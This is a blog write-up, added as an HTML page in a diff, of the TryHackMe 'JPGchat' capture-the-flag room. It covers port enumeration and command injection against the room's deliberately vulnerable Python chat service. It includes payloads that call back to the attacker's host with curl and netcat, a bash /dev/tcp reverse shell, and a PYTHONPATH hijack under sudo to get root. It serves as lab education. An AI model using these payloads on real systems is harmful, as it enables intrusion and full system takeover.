@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>TryHackMe! JPGchat room | JamBlog</title>
+<meta name="generator" content="Jekyll v3.8.7" />
+<meta property="og:title" content="TryHackMe! JPGchat room" />
+<meta name="author" content="JamBot" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="a reasonably in depth look at the JPGchat TryHackMe! room :)" />
+<meta property="og:description" content="a reasonably in depth look at the JPGchat TryHackMe! room :)" />
+<link rel="canonical" href="http://localhost:4000/blog/THM-JPGchat-writeup" />
+<meta property="og:url" content="http://localhost:4000/blog/THM-JPGchat-writeup" />
+<meta property="og:site_name" content="JamBlog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-03-05T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="TryHackMe! JPGchat room" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","url":"http://localhost:4000/blog/THM-JPGchat-writeup","headline":"TryHackMe! JPGchat room","dateModified":"2021-03-05T00:00:00+00:00","datePublished":"2021-03-05T00:00:00+00:00","author":{"@type":"Person","name":"JamBot"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blog/THM-JPGchat-writeup"},"description":"a reasonably in depth look at the JPGchat TryHackMe! room :)","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="JamBlog" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">JamBlog<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://instagram.com/jamie_on_drums"><i class="fab fa-fab fa-fw fa-instagram"></i></a><a class="color-purple-hover" href="https://github.com/jambot3000"><i class="fab fa-github-square"></i></a><a class="color-blue-hover" href="https://twitter.com/Bot3000Jam"><i class="fab fa-fab fa-fw fa-twitter"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+    
+    
+        <img src="
+            https://github.com/jambot3000.png
+        " class="author-avatar" alt="Avatar" />
+    
+I'm Jamie, also known as JamBot! This is just where I'll document various impulsive ideas and projects of mine. I like computers and some other stuff :) 
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">TryHackMe! JPGchat room</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/thm/">thm</a>
+      
+      <a class="tag" href="/tag/pentesting/">pentesting</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 05 Mar 2021</div>
+  
+  <noscript>
+    <div class="post-description">a reasonably in depth look at the JPGchat TryHackMe! room :)</div>
+  </noscript>
+  <div id="animated-post-description" class="post-description" style="display: none;"></div>
+  
+  <!-- aa -->
+<h1 id="explanation">Explanation</h1>
+
+<p>This is my second tryhackme writeup, and it’s another easy room, but I figured I’d get into the swing of blogging again and just get something out there. Because some of the stuff in <a href="https://tryhackme.com/room/jpgchat">this room</a> is similar to the 0day room, I’ll be trying to go more in depth into multiple possible attack vectors, and specifically how <strong>I</strong> did things :)</p>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<h3 id="nmap">Nmap</h3>
+
+<p>Okay so as usual for most boot2roots we start of with an nmap scan, to see what ports are open, and what services could be running. Because of the image and description, I’m thinking that this is gonna be a Flask or Django server maybe? This ended up not being the case, but this made me think that the room dev chose python for a reason. Apparantly not?</p>
+
+<p><img src="https://jambot3000.github.io/assets/images/JPGchat-description.png" /></p>
+
+<p>Anyways, here are the results from our nmap scan:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.80 scan initiated Fri Mar  5 11:31:06 2021 as: nmap -sC -sV -oN nmap.log 10.10.X.X
+Nmap scan report for 10.10.X.X
+Host is up (0.072s latency).
+Not shown: 997 closed ports
+PORT     STATE    SERVICE    VERSION
+22/tcp   open     ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 fe:cc:3e:20:3f:a2:f8:09:6f:2c:a3:af:fa:32:9c:94 (RSA)
+|   256 e8:18:0c:ad:d0:63:5f:9d:bd:b7:84:b8:ab:7e:d1:97 (ECDSA)
+|_  256 82:1d:6b:ab:2d:04:d5:0b:7a:9b:ee:f4:64:b5:7f:64 (ED25519)
+3000/tcp open     tcpwrapped
+8031/tcp filtered unknown
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Mar  5 11:31:18 2021 -- 1 IP address (1 host up) scanned in 12.07 seconds
+</code></pre></div></div>
+
+<p>Cool okay so, the only thing I’m really interested in right now are the 2 high ports, specifically the open one. The SSH server doesn’t concern me too much as I recognise the version is quite recent, so I doubt we have to exploit it.</p>
+
+<p>as for that tcp port, I have no idea what it is- time for netcat :)</p>
+
+<h3 id="investigating-weird-port">Investigating weird port</h3>
+
+<p>Now I’m just gonna connect to the port and see what kind of response I get :)</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc 10.10.X.X 3000
+Welcome to JPChat
+the source code of this service can be found at our admin's github
+MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
+REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
+</code></pre></div></div>
+
+<p>Okay so immediately we are told we can find source code for the running service. This seems to be turning into a pwn challenge, in which we are given some code, or an application that we can test locally, to make an exploit- then craft a similar exploit to be used over a network etc.</p>
+
+<p>Let’s go on github and look for this :)</p>
+
+<p><img src="https://jambot3000.github.io/assets/images/githubJPGchat.png" /></p>
+
+<p>Okay so the second one seems to be what we want here. So let’s just take a look at the source code and see what we can find :)</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="k">print</span> <span class="p">(</span><span class="s">'Welcome to JPChat'</span><span class="p">)</span>
+<span class="k">print</span> <span class="p">(</span><span class="s">'the source code of this service can be found at our admin</span><span class="se">\'</span><span class="s">s github'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">report_form</span><span class="p">():</span>
+
+	<span class="k">print</span> <span class="p">(</span><span class="s">'this report will be read by Mozzie-jpg'</span><span class="p">)</span>
+	<span class="n">your_name</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">'your name:</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+	<span class="n">report_text</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">'your report:</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+	<span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"bash -c 'echo %s &gt; /opt/jpchat/logs/report.txt'"</span> <span class="o">%</span> <span class="n">your_name</span><span class="p">)</span>
+	<span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"bash -c 'echo %s &gt;&gt; /opt/jpchat/logs/report.txt'"</span> <span class="o">%</span> <span class="n">report_text</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">chatting_service</span><span class="p">():</span>
+
+	<span class="k">print</span> <span class="p">(</span><span class="s">'MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel'</span><span class="p">)</span>
+	<span class="k">print</span> <span class="p">(</span><span class="s">'REPORT USAGE: use [REPORT] to report someone to the admins (with proof)'</span><span class="p">)</span>
+	<span class="n">message</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">''</span><span class="p">)</span>
+
+	<span class="k">if</span> <span class="n">message</span> <span class="o">==</span> <span class="s">'[REPORT]'</span><span class="p">:</span>
+		<span class="n">report_form</span><span class="p">()</span>
+	<span class="k">if</span> <span class="n">message</span> <span class="o">==</span> <span class="s">'[MESSAGE]'</span><span class="p">:</span>
+		<span class="k">print</span> <span class="p">(</span><span class="s">'There are currently 0 other users logged in'</span><span class="p">)</span>
+		<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+			<span class="n">message2</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">'[MESSAGE]: '</span><span class="p">)</span>
+			<span class="k">if</span> <span class="n">message2</span> <span class="o">==</span> <span class="s">'[REPORT]'</span><span class="p">:</span>
+				<span class="n">report_form</span><span class="p">()</span>
+
+<span class="n">chatting_service</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Hmm. Okay so this definitely isn’t the code that’s running, so I assume this was made for the purposes of the challenge. Anyway, the vulnerability seems pretty clear here; this code trusts unsanitised user input. As for the actual code that’s running the TCP server I’m not sure. But if it’s anything similar to this, which I think it will be, then we can exploit the trust it puts on the end user</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>The part I want to focus on is this:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">your_name</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">'your name:</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+	<span class="n">report_text</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">'your report:</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+	<span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"bash -c 'echo %s &gt; /opt/jpchat/logs/report.txt'"</span> <span class="o">%</span> <span class="n">your_name</span><span class="p">)</span>
+	<span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"bash -c 'echo %s &gt;&gt; /opt/jpchat/logs/report.txt'"</span> <span class="o">%</span> <span class="n">report_text</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>After receiving input, this script goes ahead and puts that input into a command ran on the host. So, for example, if we provided <code class="highlighter-rouge">this is a test</code> as the text for the report, then the host machine would run <code class="highlighter-rouge">bash -c 'echo this is a test' &gt; /opt/jpchat/logs/report.txt</code>. With a little knowlege of bash it’s not hard to create a malicious input here. we can end the echo statement with a semi colon, and then provide our own bash to be ran on the host. the output from that will then be written to report.txt if we embed the malicious payload in the <code class="highlighter-rouge">your_name</code> variable, or it will be appended to report.txt, if we store it in the <code class="highlighter-rouge">report_text</code> variable. Of course this doesn’t matter for us, as all we care about is code execution</p>
+
+<p>So let’s see if we can do this :)</p>
+
+<p>I’m going to start a python simple http server and try to get the machine to send a GET request via curl. Here is the one liner I made to do this:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3 -c 'IP="YOUR IP HERE"; PORT="PORT HERE"; print(f"[REPORT]\nname\n;curl http://{IP}:{PORT}")' | nc 10.10.X.X 3000
+</code></pre></div></div>
+
+<p>So what this is doing, is printing 3 seperate lines (\n is used to indicate a newline). The first line is <code class="highlighter-rouge">[REPORT]</code>, the second line is just some random input provided for name, and then the last line is <code class="highlighter-rouge">;curl http://ip:port</code>. The semi colon at the start of this line is what I was talking about before- we use it to show the end of the echo statement, so that we can begin our own. The last part <code class="highlighter-rouge">| nc 10.10.X.X 3000</code> is simply the input being generated by python being piped into the tcp connection we make with netcat. So we run this, and….</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3 -c 'IP="YOUR IP"; PORT="PORT"; print(f"[REPORT]\nname\n;curl http://{IP}:{PORT}")' | nc 10.10.X.X 3000
+Welcome to JPChat
+the source code of this service can be found at our admin's github
+MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
+REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
+this report will be read by Mozzie-jpg
+your name:
+your report:
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.X.X - - [05/Mar/2021 15:53:29] "GET / HTTP/1.1" 200 -
+</code></pre></div></div>
+
+<p>Awesome!! We got code execution! Now, sending a request to a server is a common way to test for code execution, but it is also equally common for systems to have firewalls blocking tcp connections, and requests. DNS smuggling can allow us to mitigate this problem. It’s less common for there to be something filtering DNS requests, as well if urls are to be resolved, then DNS requests must be made. Of course there are other options if we need to bypass firewalls, that’s just a common one.</p>
+
+<p>For more information on this, please check out stok’s video on this subject: <a href="https://www.youtube.com/watch?v=p8wbebEgtDk">https://www.youtube.com/watch?v=p8wbebEgtDk</a>.</p>
+
+<p>Anyways now that we have code execution, and we touched on another method of data exfiltration we could have used, lets try getting a shell :) I won’t be going into the different methods of doing that, as I already done that in a <a href="https://jambot3000.github.io/blog/THM-0DAY-writeup">different blog</a></p>
+
+<p>We’re just gonna be going for a basic reverse tcp shell. So the code we want to execute on the server will be something like: <code class="highlighter-rouge">bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</code></p>
+
+<p>Naturally the first thing I try is setting up a listener and then trying out <code class="highlighter-rouge">python3 -c 'IP="IP"; PORT="PORT"; print(f"[REPORT]\nname\n;bash -i &gt;&amp; /dev/tcp/{IP}/{PORT} 0&gt;&amp;1")' | nc 10.10.X.X 3000</code> as the payload. And well, I got a shell, but it wasn’t functional. I wasn’t able to get output.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 3000
+Listening on 0.0.0.0 3000
+Connection received on 10.10.201.9 55046
+bash: cannot set terminal process group (993): Inappropriate ioctl for device
+bash: no job control in this shell
+wes@ubuntu-xenial:/$ ls
+ls
+wes@ubuntu-xenial:/$
+</code></pre></div></div>
+
+<p>So we see that it tells us that for whatever reason, the input/output control is weird and not good enough to get us a stable shell. As I couldn’t see what was going on behind the scenes, I assumed that this was due to how the tcp server had been made. Maybe it was handling input weirdly and not properly encoding/decoding it? or maybe it was running under some other weird conditions I couldn’t see? I wasn’t entirely sure why this wasn’t working, so I started playing around with the input. Eventually through fuzzing and playing around with the server, I found that the use of <code class="highlighter-rouge">$()</code> would show output in my listener, when a command was used in it. After completing the CTF I took a look at some other writeups to see if anyone else had encoutered this problem but this didn’t seem to be the case at all? Maybe it was something to do with my one liner, or maybe it’s a bug in the room. Either way it’s fine, I got something that worked for me in the end. I understand that it can be annoying seeing “just play around with it” but I can’t put it into better words unfortunately. All I done was try out different things I’ve seen work before, until eventually I got something to work. It can be a tedious process but sometimes there just aren’t ways to avoid it.</p>
+
+<p>So, the payload that got actually got me output ended up being: <code class="highlighter-rouge">python3 -c 'IP="PORT"; PORT="PORT"; print(f"[REPORT]\nname\n;echo $(ls) | nc {IP} {PORT}")' | nc 10.10.X.X 3000</code>. This gave me the following output:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 3000
+Listening on 0.0.0.0 3000
+Connection received on 10.10.201.9 55078
+bin boot box_setup dev etc home initrd.img initrd.img.old lib lib64 lost+found media mnt opt proc root run sbin snap srv sys tmp usr vagrant var vmlinuz vmlinuz.old
+</code></pre></div></div>
+
+<p>Cool, so we got that to work. As for how I knew netcat was on the machine, well, I didn’t- I honestly just guessed. I was pretty sure that netcat was a package included with a standard ubuntu xenial installation, and I knew it would make things easier for me so it was worth the try.</p>
+
+<h3 id="finally-popping-a-shell">Finally popping a shell.</h3>
+
+<p>After seeing I was able to get commands to work using <code class="highlighter-rouge">$()</code> I figured the next logical step was to try getting a shell again, but placing the bash to spawn a reverse shell inside of those brackets</p>
+
+<p>So we try it: <code class="highlighter-rouge">python3 -c 'IP="IP";PORT="PORT";print(f"[REPORT]\nname\n;$(bash -i &gt;&amp; /dev/tcp/{IP}/{PORT} 0&gt;&amp;1)")' | nc 10.10.X.X 3000</code></p>
+
+<p>and:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 3000
+Listening on 0.0.0.0 3000
+Connection received on 10.10.201.9 55096
+bash: cannot set terminal process group (1686): Inappropriate ioctl for device
+bash: no job control in this shell
+wes@ubuntu-xenial:/$ id
+id
+uid=1001(wes) gid=1001(wes) groups=1001(wes)
+wes@ubuntu-xenial:/$
+</code></pre></div></div>
+
+<p>Okay this is great, but, now I’m even more confused. We got a shell on the server which is great, but we got the same error as before. I’m still not sure why that happened, I’d love to find out though :)</p>
+
+<h2 id="user">User</h2>
+
+<p>The user flag can be found in <code class="highlighter-rouge">wes</code>’s home directory</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wes@ubuntu-xenial:~$ cat user.txt
+cat user.txt
+JPC{do it yourself!}
+</code></pre></div></div>
+
+<h2 id="root">Root</h2>
+
+<p>Okay so my approach to privilege escelation was kind of boring. As a lot of easy boot2roots have common privesc vectors, I find that it’s often one of a few things. I always make sure to check the kernel version being used (incase there are any major exploits available), the permissions we have as a user, and the binaries with the SUID bit enabled. As I checked what our user is able to run as root with <code class="highlighter-rouge">sudo -l</code> I found the privesc vector. I see a lot of people complain that writeups don’t go into how you were supposed to know to do something. To this I’d say experience is the most tool you have, but there are enumeeration scripts available that can aid the process. <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPeas</a> and <a href="https://github.com/rebootuser/LinEnum">LinEnum</a> are popular ones that can work wonders.</p>
+
+<p>Anyways, after running <code class="highlighter-rouge">sudo -l</code> or running one of the enum scripts mentioned, we should eventually find this:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wes@ubuntu-xenial:/$ sudo -l
+sudo -l
+Matching Defaults entries for wes on ubuntu-xenial:
+    mail_badpass, env_keep+=PYTHONPATH
+
+User wes may run the following commands on ubuntu-xenial:
+    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
+wes@ubuntu-xenial:/$
+</code></pre></div></div>
+
+<p>Basically what this tell us is that we can run <code class="highlighter-rouge">/usr/bin/python3 /opt/development/test_module.py</code> as root.</p>
+
+<p>So naturally we look at the code for this script, to see what we are actaully running as root.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">from</span> <span class="nn">compare</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">compare</span><span class="p">.</span><span class="n">Str</span><span class="p">(</span><span class="s">'hello'</span><span class="p">,</span> <span class="s">'hello'</span><span class="p">,</span> <span class="s">'hello'</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>So when I seen this, I originally had the wrong idea. I thought about what happens when you import a python module. Like if you had installed numpy, but then also had a file called <code class="highlighter-rouge">numpy.py</code> in the same directory as the python script you are running, which will it really import? So I tested this out on my system and found that it will default to the file in the same directory as the script you run. So then the next logical step knowing this, was to create a <code class="highlighter-rouge">compare.py</code> file with some malicious code in the <code class="highlighter-rouge">/opt/development/</code> directory. But the problem was that I didn’t know if I had write access to this directory. So I tried creating a new “compare.py” file in this directory.</p>
+
+<p>And…</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wes@ubuntu-xenial:/opt/development$ touch compare.py
+touch: cannot touch 'compare.py': Permission denied
+wes@ubuntu-xenial:/opt/development$
+</code></pre></div></div>
+
+<p>Damn :/ at this point I wasn’t too sure what to do, I checked to see if this was a well known module with known exploits, I checked to see if I could edit the code behind the module it imports. Nothing I tried seemed to work. So I looked again at the output of <code class="highlighter-rouge">sudo -l</code>, remembering I had seen some unfamiliar stuff.</p>
+
+<p>I had neglected the <code class="highlighter-rouge">env_keep+=PYTHONPATH</code> part of this output. This is important because we can our own environment variables, and when <code class="highlighter-rouge">/usr/bin/python3 /opt/development/test_module.py</code> is ran, it will use the <code class="highlighter-rouge">PYTHONPATH</code> environment variable if we have set one. With a bit of research, we find out that this variable tells python where to look for additional modules. So presumably we are able to set the <code class="highlighter-rouge">PYTHONPATH</code> environment variable to somewhere where we have write access, and then make a <code class="highlighter-rouge">compare.py</code> file that overwrites the one this script imports. So let’s try that.</p>
+
+<p>There are a few directories that all users should always have access to such as <code class="highlighter-rouge">/tmp</code> and <code class="highlighter-rouge">/dev/shm</code> that we could write to, but we don’t need to worry about having to do this because we are a user with a home directory, so we are able to write here</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wes@ubuntu-xenial:~$ export PYTHONPATH=/home/wes; echo "import os" &gt; compare.py; echo "os.system('/bin/bash')" &gt;&gt; compare.py
+</code></pre></div></div>
+
+<p>So with this, we have set the environment variable such that python will read the <code class="highlighter-rouge">compare.py</code> file from the user <code class="highlighter-rouge">wes</code>’s home directory. Then we have some code in this file that should start a shell. Because this would be running as root we would get a root shell :)</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wes@ubuntu-xenial:~$ sudo /usr/bin/python3 /opt/development/test_module.py
+
+id    
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div></div>
+
+<p>So we got a shell, but it doesn’t look very nice. If we wanted to spawn a TTY shell we could have used the <code class="highlighter-rouge">pty</code> module in python, not that it matters now that we have root.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /root/root.txt
+JPC{do it yourself}
+
+Also huge shoutout to Westar for the OSINT idea
+i wouldn't have used it if it wasnt for him.
+and also thank you to Wes and Optional for all the help while developing
+
+You can find some of their work here:
+https://github.com/WesVleuten
+https://github.com/optionalCTF
+</code></pre></div></div>
+
+<p>Awesome :) This was a nice room</p>
+
+</div>
+
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/blog/discord-scammer-1">
+            Discord scammer #1
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/blog/THM-year-of-the-jellyfish">
+            TryHackMe! year of the jellyfish writeup
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/blog/misc-binexp-writeup">
+            Cool binary reversing stuff
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/crackme/" class="set-1">crackme</a> <a href="/tag/locks/" class="set-1">locks</a> <a href="/tag/misc/" class="set-4">misc</a> <a href="/tag/pentesting/" class="set-5">pentesting</a> <a href="/tag/thm/" class="set-5">thm</a> <a href="/tag/tutorial/" class="set-2">tutorial</a> <a href="/tag/writeup/" class="set-2">writeup</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = 'a reasonably in depth look at the JPGchat TryHackMe! room :)';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
